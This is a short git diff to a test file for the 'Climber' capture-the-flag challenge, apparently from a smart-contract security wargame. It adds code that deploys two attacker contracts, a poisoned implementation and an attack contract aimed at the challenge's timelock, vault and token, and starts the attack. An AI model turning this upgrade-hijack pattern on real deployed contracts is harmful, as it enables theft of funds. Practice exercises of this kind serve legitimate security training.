@@ -53,6 +53,9 @@ describe('[Challenge] Climber', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        this.poisonedImpl = await (await ethers.getContractFactory('PoisonedImpl', attacker)).deploy();
+        this.attacc = await (await ethers.getContractFactory('Attacc', attacker)).deploy(this.timelock.address, this.vault.address, this.token.address);
+        await this.attacc.connect(attacker).init(this.poisonedImpl.address);
     });
 
     after(async function () {
